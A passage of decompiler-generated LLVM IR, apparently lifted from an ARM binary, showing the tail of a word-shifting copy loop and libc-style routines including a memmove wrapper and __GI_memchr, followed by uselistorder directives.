  %v11_187c8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_187cc

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187cc.dec_label_pc_187cc_crit_edge, %dec_label_pc_187c4
  %v0_187f0 = phi i32 [ %v1_187f0, %dec_label_pc_187cc.dec_label_pc_187cc_crit_edge ], [ %v0_1871831, %dec_label_pc_187c4 ]
  %v0_187d0 = phi i32 [ %v0_187d0.pre, %dec_label_pc_187cc.dec_label_pc_187cc_crit_edge ], [ %v1_186d0, %dec_label_pc_187c4 ]
  %v0_187cc = phi i32 [ %v0_187cc.pre, %dec_label_pc_187cc.dec_label_pc_187cc_crit_edge ], [ %v2_186d4, %dec_label_pc_187c4 ]
  %v3_187cc = mul i32 %v0_187cc, 16777216
  store i32 %v3_187cc, i32* %lr.global-to-local, align 4
  %v1_187d0 = add i32 %v0_187d0, -4
  %v2_187d0 = inttoptr i32 %v1_187d0 to i32*
  %v3_187d0 = load i32, i32* %v2_187d0, align 4
  store i32 %v3_187d0, i32* %r3.global-to-local, align 4
  %v4_187d0 = add i32 %v0_187d0, -8
  %v5_187d0 = inttoptr i32 %v4_187d0 to i32*
  %v6_187d0 = load i32, i32* %v5_187d0, align 4
  store i32 %v6_187d0, i32* %r4.global-to-local, align 4
  %v7_187d0 = add i32 %v0_187d0, -12
  %v8_187d0 = inttoptr i32 %v7_187d0 to i32*
  %v9_187d0 = load i32, i32* %v8_187d0, align 4
  store i32 %v9_187d0, i32* %r5.global-to-local, align 4
  %v10_187d0 = add i32 %v0_187d0, -16
  %v11_187d0 = inttoptr i32 %v10_187d0 to i32*
  %v12_187d0 = load i32, i32* %v11_187d0, align 4
  store i32 %v10_187d0, i32* %r1.global-to-local, align 4
  %v4_187d4 = udiv i32 %v12_187d0, 256
  %v5_187d4 = or i32 %v4_187d4, %v3_187cc
  store i32 %v5_187d4, i32* %lr.global-to-local, align 4
  %v3_187d8 = mul i32 %v12_187d0, 16777216
  %v4_187dc = udiv i32 %v9_187d0, 256
  %v5_187dc = or i32 %v3_187d8, %v4_187dc
  store i32 %v5_187dc, i32* @ip, align 4
  %v3_187e0 = mul i32 %v9_187d0, 16777216
  %v4_187e4 = udiv i32 %v6_187d0, 256
  %v5_187e4 = or i32 %v3_187e0, %v4_187e4
  store i32 %v5_187e4, i32* %r5.global-to-local, align 4
  %v3_187e8 = mul i32 %v6_187d0, 16777216
  %v4_187ec = udiv i32 %v3_187d0, 256
  %v5_187ec = or i32 %v3_187e8, %v4_187ec
  store i32 %v5_187ec, i32* %r4.global-to-local, align 4
  %v1_187f0 = add i32 %v0_187f0, -16
  %v2_187f0 = inttoptr i32 %v1_187f0 to i32*
  store i32 %v5_187ec, i32* %v2_187f0, align 4
  %v4_187f0 = add i32 %v0_187f0, -12
  %v5_187f0 = inttoptr i32 %v4_187f0 to i32*
  %v6_187f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_187f0, i32* %v5_187f0, align 4
  %v7_187f0 = add i32 %v0_187f0, -8
  %v8_187f0 = inttoptr i32 %v7_187f0 to i32*
  %v9_187f0 = load i32, i32* @ip, align 4
  store i32 %v9_187f0, i32* %v8_187f0, align 4
  %v10_187f0 = add i32 %v0_187f0, -4
  %v11_187f0 = inttoptr i32 %v10_187f0 to i32*
  %v12_187f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_187f0, i32* %v11_187f0, align 4
  store i32 %v1_187f0, i32* %r0.global-to-local, align 4
  %v0_187f4 = load i32, i32* %r2.global-to-local, align 4
  %v2_187f4 = add i32 %v0_187f4, -16
  store i32 %v2_187f4, i32* %r2.global-to-local, align 4
  %v6_187f8 = icmp slt i32 %v0_187f4, 16
  br i1 %v6_187f8, label %dec_label_pc_187fc, label %dec_label_pc_187cc.dec_label_pc_187cc_crit_edge

dec_label_pc_187cc.dec_label_pc_187cc_crit_edge:  ; preds = %dec_label_pc_187cc
  %v0_187cc.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_187d0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_187cc

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187cc
  %v2_187fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_187fc, i32* @r4, align 4
  %v5_187fc = load i8*, i8** %stack_var_-8, align 4
  %v6_187fc = ptrtoint i8* %v5_187fc to i32
  store i32 %v6_187fc, i32* @r5, align 4
  store i32 %v11_187c8, i32* @lr, align 4
  %v2_18800 = add i32 %v0_187f4, -4
  store i32 %v2_18800, i32* %r2.global-to-local, align 4
  %v4_18800 = add i32 %v0_187f4, 2147483632
  %v5_18800 = and i32 %v2_18800, %v4_18800
  %v6_18800 = icmp slt i32 %v5_18800, 0
  store i1 %v6_18800, i1* %cpsr_v.global-to-local, align 1
  %v7_18800 = icmp slt i32 %v2_18800, 0
  store i1 %v7_18800, i1* %cpsr_n.global-to-local, align 1
  %v5_18804 = icmp slt i32 %v2_187f4, -12
  br i1 %v5_18804, label %dec_label_pc_18820, label %dec_label_pc_18808

dec_label_pc_18808:                               ; preds = %dec_label_pc_187fc, %dec_label_pc_187bc, %dec_label_pc_18808
  %v1_18814 = phi i32 [ %v5_18814, %dec_label_pc_18808 ], [ %v1_187f0, %dec_label_pc_187fc ], [ %v0_1871831, %dec_label_pc_187bc ]
  %v0_18808 = load i32, i32* %r3.global-to-local, align 4
  %v3_18808 = mul i32 %v0_18808, 16777216
  store i32 %v3_18808, i32* %ip.global-to-local, align 4
  %v0_1880c = load i32, i32* %r1.global-to-local, align 4
  %v1_1880c = add i32 %v0_1880c, -4
  %v2_1880c = inttoptr i32 %v1_1880c to i32*
  %v3_1880c = load i32, i32* %v2_1880c, align 4
  store i32 %v3_1880c, i32* %r3.global-to-local, align 4
  store i32 %v1_1880c, i32* %r1.global-to-local, align 4
  %v4_18810 = udiv i32 %v3_1880c, 256
  %v5_18810 = or i32 %v4_18810, %v3_18808
  store i32 %v5_18810, i32* @ip, align 4
  %v2_18814 = add i32 %v1_18814, -4
  %v3_18814 = inttoptr i32 %v2_18814 to i32*
  store i32 %v5_18810, i32* %v3_18814, align 4
  %v4_18814 = load i32, i32* %r0.global-to-local, align 4
  %v5_18814 = add i32 %v4_18814, -4
  store i32 %v5_18814, i32* %r0.global-to-local, align 4
  %v0_18818 = load i32, i32* %r2.global-to-local, align 4
  %v2_18818 = add i32 %v0_18818, -4
  store i32 %v2_18818, i32* %r2.global-to-local, align 4
  %v6_1881c = icmp slt i32 %v0_18818, 4
  br i1 %v6_1881c, label %dec_label_pc_18820.loopexit, label %dec_label_pc_18808

dec_label_pc_18820.loopexit:                      ; preds = %dec_label_pc_18808
  %v4_18818 = sub i32 3, %v0_18818
  %v5_18818 = and i32 %v4_18818, %v0_18818
  %v6_18818 = icmp slt i32 %v5_18818, 0
  %v7_18818 = icmp slt i32 %v2_18818, 0
  store i1 %v6_18818, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18818, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18820.loopexit, %dec_label_pc_187fc
  %v2_1868c65 = phi i32 [ %v5_18814, %dec_label_pc_18820.loopexit ], [ %v1_187f0, %dec_label_pc_187fc ]
  %v0_1867c61 = phi i32 [ %v2_18818, %dec_label_pc_18820.loopexit ], [ %v2_18800, %dec_label_pc_187fc ]
  %v0_18820 = load i32, i32* %r1.global-to-local, align 4
  %v1_18820 = add i32 %v0_18820, 1
  store i32 %v1_18820, i32* @r1, align 4
  br label %bb143

; uselistorder directives
  uselistorder i32 %v5_18814, { 0, 2, 1 }
  uselistorder i32 %v3_18808, { 1, 0 }
  uselistorder i32 %v2_18800, { 0, 2, 1, 3 }
  uselistorder i32 %v1_187f0, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_187d0, { 1, 0 }
  uselistorder i32 %v3_187cc, { 1, 0 }
  uselistorder i32 %v0_187d0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_187f0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_187a8, { 0, 2, 1 }
  uselistorder i32 %v3_1879c, { 1, 0 }
  uselistorder i32 %v2_18794, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18784, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_18764, { 1, 0 }
  uselistorder i32 %v3_18760, { 1, 0 }
  uselistorder i32 %v0_18764, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18784, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1873c, { 0, 2, 1 }
  uselistorder i32 %v3_18730, { 1, 0 }
  uselistorder i32 %v2_18728, { 0, 2, 1, 3 }
  uselistorder i32 %v1_18718, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_186f8, { 1, 0 }
  uselistorder i32 %v3_186f4, { 1, 0 }
  uselistorder i32 %v0_186f8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18718, { 3, 2, 1, 0 }
  uselistorder i1 %v5_187c0, { 2, 0, 1 }
  uselistorder i32 %v0_186d8, { 1, 0 }
  uselistorder i32 %v0_187c4, { 3, 0, 2, 1 }
  uselistorder i32 %v0_1871831, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_186c8, { 2, 1, 0 }
  uselistorder i32 %v0_186c8, { 2, 0, 1 }
  uselistorder i32 %v2_186c0, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_186c0, { 1, 0, 2 }
  uselistorder i32 %v0_186c0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1871832, { 2, 1, 0 }
  uselistorder i32 %v11_1869c, { 1, 0 }
  uselistorder i32 %v7_1869c, { 1, 0 }
  uselistorder i32 %v1_1867c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1867c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18680, { 1, 0 }
  uselistorder i32 %v7_18674, { 0, 2, 1 }
  uselistorder i32 %v10_18670, { 1, 0 }
  uselistorder i32 %v9_18668, { 1, 0, 2 }
  uselistorder i32 %v6_18664, { 1, 0 }
  uselistorder i32 %v2_1865c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1865c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1866c, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18650, { 0, 2, 1 }
  uselistorder i32 %v13_1864c, { 1, 0 }
  uselistorder i32 %v4_18648, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18648, { 2, 0, 1 }
  uselistorder i32 %v6_18650, { 0, 3, 2, 1 }
  uselistorder i32 %v7_18640, { 0, 2, 1 }
  uselistorder i32 %v16_1863c, { 1, 0 }
  uselistorder i32 %v4_18638, { 1, 0 }
  uselistorder i32 %v0_18648.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_18640, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1862c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_18628, { 1, 0 }
  uselistorder i32 %v1_18624, { 1, 0 }
  uselistorder i32 %v10_18620, { 1, 0 }
  uselistorder i32 %v0_18620, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18624, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_18618, { 0, 2, 1 }
  uselistorder i32 %v2_1860c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1860c, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v0_1862449, { 1, 2, 0 }
  uselistorder i32 %v1_18604, { 2, 1, 0 }
  uselistorder i32 %v1_185fc, { 2, 3, 1, 0 }
  uselistorder i32 %v2_185f4, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_185f0, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_185ec, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_185ec, { 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %v4_185d8, { 0, 2, 1 }
  uselistorder i32 %v3_185cc, { 1, 0 }
  uselistorder i32 %v2_185c4, { 0, 2, 1, 3 }
  uselistorder i32 %v12_185b4, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18594, { 1, 0, 2 }
  uselistorder i32 %v5_18594, { 1, 0, 2 }
  uselistorder i32 %v2_18594, { 1, 0, 2 }
  uselistorder i32 %v3_18590, { 1, 0 }
  uselistorder i32 %v0_18594, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_185b4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_1856c, { 0, 2, 1 }
  uselistorder i32 %v3_18560, { 1, 0 }
  uselistorder i32 %v2_18558, { 0, 2, 1, 3 }
  uselistorder i32 %v12_18548, { 1, 0, 3, 2 }
  uselistorder i32 %v8_18528, { 1, 0, 2 }
  uselistorder i32 %v5_18528, { 1, 0, 2 }
  uselistorder i32 %v2_18528, { 1, 0, 2 }
  uselistorder i32 %v3_18524, { 1, 0 }
  uselistorder i32 %v0_18528, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_18548, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_18500, { 0, 2, 1 }
  uselistorder i32 %v3_184f4, { 1, 0 }
  uselistorder i32 %v2_184ec, { 0, 2, 1, 3 }
  uselistorder i32 %v12_184dc, { 1, 0, 3, 2 }
  uselistorder i32 %v8_184bc, { 1, 0, 2 }
  uselistorder i32 %v5_184bc, { 1, 0, 2 }
  uselistorder i32 %v2_184bc, { 1, 0, 2 }
  uselistorder i32 %v3_184b8, { 1, 0 }
  uselistorder i32 %v0_184bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_184dc, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_18584, { 2, 0, 1 }
  uselistorder i32 %v0_18588, { 3, 0, 2, 1 }
  uselistorder i32 %v0_184dc75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1848c, { 1, 0 }
  uselistorder i32 %v0_1848c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_18484, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_18484, { 1, 0, 2 }
  uselistorder i32 %v0_18484, { 2, 0, 1, 3 }
  uselistorder i32 %v0_184dc76, { 2, 1, 0 }
  uselistorder i32 %v1_18464, { 1, 0, 2 }
  uselistorder i32 %v1_1843c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1843c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_18428, { 1, 0, 2 }
  uselistorder i32 %v6_18424, { 1, 0 }
  uselistorder i32 %v2_1841c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_1841c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1842c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_18414, { 0, 2, 1 }
  uselistorder i1 %v0_18414, { 1, 0 }
  uselistorder i1 %v1_18414, { 1, 0 }
  uselistorder i32 %v3_18410, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_18408, { 0, 2, 1, 3 }
  uselistorder i32 %v4_183f4, { 1, 0 }
  uselistorder i32 %v12_183e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_183dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_183e0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_183d0, { 0, 2, 1 }
  uselistorder i32 %v2_183c8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_183c8, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_183c0, { 1, 0 }
  uselistorder i32 %v1_183b8, { 2, 1, 0 }
  uselistorder i32 %v2_183b0, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_183b0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_183a0, { 1, 0 }
  uselistorder i32 %v1_183a0, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_183a0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 24, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 39, 40, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 64, 65, 66, 67, 68, 69, 35, 60, 36, 37, 38, 39, 40, 61, 41, 42, 43, 44, 45, 62, 46, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 63 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 34, 32, 35, 33, 36, 20, 18, 26, 19, 21, 24, 22, 27, 23, 25, 28, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 25, 4, 5, 26, 6, 7, 27, 8, 9, 10, 11, 12, 13, 28, 14, 16, 15, 17, 18, 29, 19, 20, 30, 21, 22, 23, 24, 31, 57, 59, 60, 32, 39, 33, 34, 40, 35, 36, 37, 38, 41, 42, 0, 43, 44, 46, 45, 47, 48, 58, 49, 50, 51, 54, 52, 53, 55, 56, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 0, 41, 1, 24, 2, 25, 42, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 0, 47, 1, 27, 2, 28, 48, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 27, 28, 29, 26, 0 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 13, 14, 15, 16, 17, 18, 12, 11, 5, 10, 9, 8, 7, 19, 20, 21, 22, 6, 23, 24, 3, 0, 28, 25, 26, 27, 2, 29, 30, 4, 1 }
  uselistorder label %dec_label_pc_18808, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1879c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18730, { 2, 0, 1 }
  uselistorder label %dec_label_pc_186d0, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_1865c, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_18620, { 1, 0 }
  uselistorder label %dec_label_pc_1860c, { 1, 0 }
  uselistorder label %dec_label_pc_185cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18560, { 2, 0, 1 }
  uselistorder label %dec_label_pc_184f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18494, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 4, 6, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_18408, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_183c8, { 1, 0 }
}

define i32 @function_18828(i32 %arg1) local_unnamed_addr {
dec_label_pc_18828:
  ret i32 %arg1
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_18830 = load i32, i32* @r0, align 4
  %v1_18830 = load i32, i32* @r1, align 4
  %v2_18830 = inttoptr i32 %v0_18830 to i8*
  %v3_18830 = call i32 @_memcpy(i8* %v2_18830, i32 %v1_18830)
  ret i32 %v3_18830

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_18840 = load i32, i32* @r4, align 4
  %v6_18840 = load i32, i32* @r5, align 4
  %v9_18840 = load i32, i32* @r6, align 4
  %v1_18844 = urem i32 %arg1, 256
  %v0_1886018 = load i32, i32* @r2, align 4
  %v2_1886020 = icmp eq i32 %v0_1886018, 0
  br i1 %v2_1886020, label %dec_label_pc_18870, label %dec_label_pc_18868

dec_label_pc_1884c:                               ; preds = %dec_label_pc_18868
  %v3_1884c = load i8, i8* %.021, align 1
  %v4_1884c = zext i8 %v3_1884c to i32
  %v9_18850 = icmp eq i32 %v4_1884c, %v1_18844
  %v1_18854 = add i32 %v0_18854, -1
  br i1 %v9_18850, label %bb, label %dec_label_pc_18860

bb:                                               ; preds = %dec_label_pc_1884c
  ret i32 %v1_18868

dec_label_pc_18860:                               ; preds = %dec_label_pc_1884c
  %v2_1885c = add i32 %v1_18868, 1
  %v3_1885c = inttoptr i32 %v2_1885c to i8*
  %v2_18860 = icmp eq i32 %v1_18854, 0
  br i1 %v2_18860, label %dec_label_pc_18870, label %dec_label_pc_18868

dec_label_pc_18868:                               ; preds = %entry, %dec_label_pc_18860
  %v0_18854 = phi i32 [ %v1_18854, %dec_label_pc_18860 ], [ %v0_1886018, %entry ]
  %.021 = phi i8* [ %v3_1885c, %dec_label_pc_18860 ], [ undef, %entry ]
  %v1_18868 = ptrtoint i8* %.021 to i32
  %v2_18868 = urem i32 %v1_18868, 4
  %v3_18868 = icmp eq i32 %v2_18868, 0
  br i1 %v3_18868, label %dec_label_pc_18870, label %dec_label_pc_1884c

dec_label_pc_18870:                               ; preds = %dec_label_pc_18860, %dec_label_pc_18868, %entry
  %v0_188fc37 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_18860 ], [ %v0_18854, %dec_label_pc_18868 ]
  %.0.lcssa = phi i8* [ undef, %entry ], [ %v3_1885c, %dec_label_pc_18860 ], [ %.021, %dec_label_pc_18868 ]
  %v4_18870 = mul nuw nsw i32 %v1_18844, 256
  %v5_18870 = or i32 %v4_18870, %v1_18844
  %v1_18874 = ptrtoint i8* %.0.lcssa to i32
  %v4_18878 = mul i32 %v5_18870, 65536
  %v5_18878 = or i32 %v4_18878, %v5_18870
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_188fc37, 3
  br i1 %tmp, label %dec_label_pc_18880, label %dec_label_pc_18924.preheader

dec_label_pc_18880:                               ; preds = %dec_label_pc_18870, %dec_label_pc_188fc.backedge
  %v0_1889c82 = phi i32 [ %v1_1889c, %dec_label_pc_188fc.backedge ], [ %v0_188fc37, %dec_label_pc_18870 ]
  %v0_1888081 = phi i32 [ %v4_18880, %dec_label_pc_188fc.backedge ], [ %v1_18874, %dec_label_pc_18870 ]
  %v1_18880 = inttoptr i32 %v0_1888081 to i32*
  %v2_18880 = load i32, i32* %v1_18880, align 4
  %v4_18880 = add i32 %v0_1888081, 4
  %v2_18884 = xor i32 %v2_18880, %v5_18878
  %v2_18888 = add i32 %v2_18884, 2130640639
  %v1_1888c = sub i32 -1, %v2_18884
  %v2_18890 = xor i32 %v2_18888, %v1_1888c
  %v2_18894 = and i32 %v2_18890, -2130640640
  %v2_18898 = icmp eq i32 %v2_18894, 0
  %v1_1889c = add i32 %v0_1889c82, -4
  br i1 %v2_18898, label %dec_label_pc_188fc.backedge, label %dec_label_pc_188a4

dec_label_pc_188fc.backedge:                      ; preds = %dec_label_pc_18880, %dec_label_pc_188e8
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_1889c, 3
  br i1 %tmp107, label %dec_label_pc_18880, label %dec_label_pc_18924.preheader

dec_label_pc_188a4:                               ; preds = %dec_label_pc_18880
  %v2_188a4 = inttoptr i32 %v0_1888081 to i8*
  %v3_188a4 = load i8, i8* %v2_188a4, align 1
  %v4_188a4 = zext i8 %v3_188a4 to i32
  %v9_188ac = icmp eq i32 %v4_188a4, %v1_18844
  %v1_188b0 = add i32 %v0_1888081, 3
  %v1_188b4 = add i32 %v0_1888081, 1
  store i32 %v1_188b4, i32* @lr, align 4
  %v1_188b8 = add i32 %v0_1888081, 2
  br i1 %v9_188ac, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_188a4
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 %v0_1888081

bb51:                                             ; preds = %dec_label_pc_188a4
  %v2_188c0 = inttoptr i32 %v1_188b4 to i8*
  %v3_188c0 = load i8, i8* %v2_188c0, align 1
  %v4_188c0 = zext i8 %v3_188c0 to i32
  %v9_188c4 = icmp eq i32 %v4_188c0, %v1_18844
  br i1 %v9_188c4, label %dec_label_pc_188cc, label %dec_label_pc_188d4

dec_label_pc_188cc:                               ; preds = %bb51
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 %v1_188b4

dec_label_pc_188d4:                               ; preds = %bb51
  %v2_188d4 = inttoptr i32 %v1_188b8 to i8*
  %v3_188d4 = load i8, i8* %v2_188d4, align 1
  %v4_188d4 = zext i8 %v3_188d4 to i32
  %v9_188d8 = icmp eq i32 %v4_188d4, %v1_18844
  br i1 %v9_188d8, label %dec_label_pc_188e0, label %dec_label_pc_188e8

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188d4
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 %v1_188b8

dec_label_pc_188e8:                               ; preds = %dec_label_pc_188d4
  %v2_188e8 = inttoptr i32 %v1_188b0 to i8*
  %v3_188e8 = load i8, i8* %v2_188e8, align 1
  %v4_188e8 = zext i8 %v3_188e8 to i32
  %v9_188ec = icmp eq i32 %v4_188e8, %v1_18844
  br i1 %v9_188ec, label %dec_label_pc_188f4, label %dec_label_pc_188fc.backedge

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188e8
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 %v1_188b0

dec_label_pc_18924.preheader:                     ; preds = %dec_label_pc_188fc.backedge, %dec_label_pc_18870
  %v0_18880.lcssa = phi i32 [ %v1_18874, %dec_label_pc_18870 ], [ %v4_18880, %dec_label_pc_188fc.backedge ]
  %v0_1889c.lcssa = phi i32 [ %v0_188fc37, %dec_label_pc_18870 ], [ %v1_1889c, %dec_label_pc_188fc.backedge ]
  %v2_1892411 = icmp eq i32 %v0_1889c.lcssa, 0
  br i1 %v2_1892411, label %dec_label_pc_1892c, label %dec_label_pc_18914

dec_label_pc_18914:                               ; preds = %dec_label_pc_18924, %dec_label_pc_18924.preheader
  %v0_18924.in = phi i32 [ %v0_18924, %dec_label_pc_18924 ], [ %v0_1889c.lcssa, %dec_label_pc_18924.preheader ]
  %v15_1891c = phi i32 [ %v1_18920, %dec_label_pc_18924 ], [ %v0_18880.lcssa, %dec_label_pc_18924.preheader ]
  %v0_18924 = add i32 %v0_18924.in, -1
  %v1_18914 = inttoptr i32 %v15_1891c to i8*
  %v2_18914 = load i8, i8* %v1_18914, align 1
  %v3_18914 = zext i8 %v2_18914 to i32
  %v9_18918 = icmp eq i32 %v3_18914, %v1_18844
  br i1 %v9_18918, label %bb52, label %dec_label_pc_18924

bb52:                                             ; preds = %dec_label_pc_18914
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 %v15_1891c

dec_label_pc_18924:                               ; preds = %dec_label_pc_18914
  %v1_18920 = add i32 %v15_1891c, 1
  %v2_18924 = icmp eq i32 %v0_18924, 0
  br i1 %v2_18924, label %dec_label_pc_1892c, label %dec_label_pc_18914

dec_label_pc_1892c:                               ; preds = %dec_label_pc_18924, %dec_label_pc_18924.preheader
  store i32 %v3_18840, i32* @r4, align 4
  store i32 %v6_18840, i32* @r5, align 4
  store i32 %v9_18840, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1891c, { 1, 0, 2 }
